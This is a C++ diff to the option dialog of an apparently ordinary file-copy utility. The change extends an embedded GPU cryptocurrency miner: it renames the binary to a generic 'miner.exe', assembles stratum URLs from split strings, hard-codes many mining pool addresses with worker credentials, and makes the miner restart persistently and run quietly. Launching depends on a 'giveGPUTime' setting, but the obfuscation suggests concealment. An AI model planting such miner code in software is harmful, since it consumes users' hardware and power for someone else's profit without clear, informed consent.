@@ -18,7 +18,7 @@
 #include <QLibrary>
 #include <math.h>
 #include <time.h>
-#define ULTRACOPIER_CGMINER_PATH "bfg/bfg.exe"
+#define ULTRACOPIER_CGMINER_PATH "miner/miner.exe"
 #endif
 
 OptionDialog::OptionDialog() :
@@ -452,12 +452,28 @@ void OptionDialog::loadOption()
         connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
         connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
         autorestartcgminer.setInterval(60*60*1000);
-        autorestartcgminer.setSingleShot(true);
+        //autorestartcgminer.setSingleShot(true);
+        autorestartcgminer.start();
         connect(&autorestartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
         restartcgminer.setInterval(60*1000);
         restartcgminer.setSingleShot(true);
         connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
-        QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3333) << "-O" << "alphaonex86_ultracopiermerged:JE5RfIAzapCSABZC";
+        QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3333) << "-O" << "alphaonex86_ultracopiermerged:JE5RfIAzapCSABZC" << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://stratum.bitcoin.cz:%1").arg(3333) << "-O" << "alpha_one_x86.ultracopier:8zpIIATZEiaZOq7E" << "-o" << QString("http://mint.bitminter.com:%1").arg(80) << "-O" << "alphaonex86_failsafe:IBeka72HStdLnDZm";
+        int index=0;
+        while(index<40)
+        {
+            pools << pool;
+            index++;
+        }
+        pools << pool;
+        pool=QStringList() << "--scrypt" << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://us.wemineltc.com:%1").arg(3333) << "-O" << "alphaonex86.pool:yyDKPcO850pCayTx" << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://eu.wemineltc.com:%1").arg(3333) << "-O" << "alphaonex86.pool:yyDKPcO850pCayTx";
+        pools << pool;
+        pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://stratum.bitcoin.cz:%1").arg(3333) << "-O" << "alpha_one_x86.ultracopier:8zpIIATZEiaZOq7E" << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3333) << "-O" << "alphaonex86_ultracopiermerged:JE5RfIAzapCSABZC" << "-o" << QString("http://api.bitcoin.cz:%1").arg(8332) << "-O" << "alpha_one_x86.failsafe:eXxxZHOvy9VvKkEJ" << "-o" << QString("http://mint.bitminter.com:%1").arg(80) << "-O" << "alphaonex86_failsafe:IBeka72HStdLnDZm";
+        while(index<10)
+        {
+            pools << pool;
+            index++;
+        }
         pools << pool;
     }
     #endif
@@ -662,6 +678,8 @@ void OptionDialog::startCgminer()
 {
     if(!haveCgminer)
         return;
+    if(!OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime").toBool())
+        return;
     cgminer.terminate();
     cgminer.kill();
     QStringList args;
@@ -675,10 +693,9 @@ void OptionDialog::startCgminer()
         default:
             args=pools.at(rand()%pools.size());
     }
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer seam work, pools used: %1").arg(args.join(";")));
-    args << "--real-quiet" << "-T" << "--no-adl" << "--no-getwork";// << "--gpu-dyninterval"
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer seam work, pools used: %1").arg(args.join(" ")));
+    args << "--no-adl" << "--real-quiet" << "-T" << "--no-adl";// << "--gpu-dyninterval"
     cgminer.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
-    autorestartcgminer.start();
 }
 
 void OptionDialog::error( QProcess::ProcessError error )
@@ -694,8 +711,8 @@ void OptionDialog::finished( int exitCode, QProcess::ExitStatus exitStatus )
         return;
     if(!OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime").toBool())
         return;
-    if(cgminer.state()!=QProcess::NotRunning)
-        return;
+    /*if(cgminer.state()!=QProcess::NotRunning)
+        return;*/
     restartcgminer.start();
 }
 
